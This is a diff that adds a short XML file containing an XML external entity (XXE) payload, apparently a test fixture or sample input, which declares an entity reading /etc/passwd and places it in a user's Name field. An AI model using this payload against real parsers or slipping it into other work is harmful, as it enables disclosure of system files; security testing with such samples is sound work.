@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY hello SYSTEM "file:///etc/passwd" > ]>
+	<Users>
+		<User>
+
+			<Name>&hello;</Name>
+			<Email>nobodycares@gmail.com</Email>
+		</User>
+	</Users>
